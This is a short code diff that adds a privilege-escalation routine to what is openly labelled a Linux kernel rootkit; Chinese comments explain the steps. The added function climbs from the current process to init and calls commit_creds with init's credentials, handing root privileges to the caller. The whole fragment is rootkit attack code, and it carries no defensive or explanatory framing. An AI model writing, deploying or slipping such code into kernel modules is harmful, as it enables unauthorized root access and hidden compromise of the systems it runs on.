@@ -480,3 +480,17 @@ struct hook_context *hook_ctx_init(void){
     return hook_ctx;
 }
 
+
+void privileged_escalation(void){
+    struct task_struct *tsk;
+        printk(KERN_INFO "[peiwithhao rootkit] Prepare kernel cred and commit...");
+        /* 获取当前进程的task_struct */
+        tsk = current;
+        while(tsk != tsk->parent){
+            tsk = tsk->parent;
+        }
+        /* 此时task变为init进程 */
+        commit_creds((struct cred *)tsk->cred);
+}
+
+
